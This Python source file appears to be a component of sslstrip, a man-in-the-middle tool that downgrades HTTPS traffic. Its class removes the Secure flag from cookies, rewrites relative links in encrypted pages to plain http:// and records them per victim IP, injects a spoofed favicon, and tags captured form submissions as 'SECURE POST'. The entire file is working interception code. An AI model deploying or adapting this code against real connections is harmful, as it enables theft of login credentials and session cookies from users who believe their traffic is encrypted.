# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import re

from .ServerConnection import ServerConnection


class SSLServerConnection(ServerConnection):
    """
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    """

    cookieExpression = re.compile(r'([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure', re.IGNORECASE)
    cssExpression = re.compile(r'url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)', re.IGNORECASE)
    iconExpression = re.compile(
        r'<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>',
        re.IGNORECASE,
    )
    linkExpression = re.compile(
        r'<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>',
        re.IGNORECASE,
    )
    headExpression = re.compile(r'<head>', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        super().__init__(command, uri, postData, headers, client)

    @property
    def log_level(self):
        return logging.INFO

    @property
    def post_prefix(self):
        return 'SECURE POST'

    def handleHeader(self, key, value):
        if key.lower() == 'set-cookie':
            value = self.cookieExpression.sub(r'\g<1>', value)
        super().handleHeader(key, value)

    @staticmethod
    def strip_file_from_path(path):
        stripped_path, _, _ = path.rpartition('/')
        return stripped_path

    def build_absolute_link(self, link):
        absolute_link = ''
        if not link.startswith(('http', '/')):
            absolute_link = 'http://{}{}/{}'.format(self.headers['host'], self.strip_file_from_path(self.uri), link)

            logging.debug('Found path-relative link in secure transmission: %s', link)
            logging.debug('New Absolute path-relative link: %s', absolute_link)
        elif not link.startswith('http'):
            absolute_link = 'http://{}{}'.format(self.headers['host'], link)

            logging.debug('New Absolute link: %s', absolute_link)

        if absolute_link:
            absolute_link = absolute_link.replace('&amp;', '&')
            self.urlMonitor.add_secure_link(self.client.getClientIP(), absolute_link)

    def replace_links_with_patterns(self, data, pattern, group_num):
        iterator = re.finditer(pattern, data)

        for match in iterator:
            self.build_absolute_link(match.group(group_num))

        return data

    def replace_favicon(self, data):
        match = re.search(self.iconExpression, data)
        if match:
            data = re.sub(
                self.iconExpression,
                '<link rel="SHORTCUT ICON" href="/favicon-x-favicon-x.ico">',
                data,
            )
        else:
            data = re.sub(
                self.headExpression,
                '<head><link rel="SHORTCUT ICON" href="/favicon-x-favicon-x.ico">',
                data,
            )

        return data

    def replace_secure_links(self, data):
        data = super().replace_secure_links(data)
        data = self.replace_links_with_patterns(data, self.cssExpression, 1)

        if self.urlMonitor.is_favicon_spoofing():
            data = self.replace_favicon(data)

        data = self.replace_links_with_patterns(data, self.linkExpression, 10)

        return data
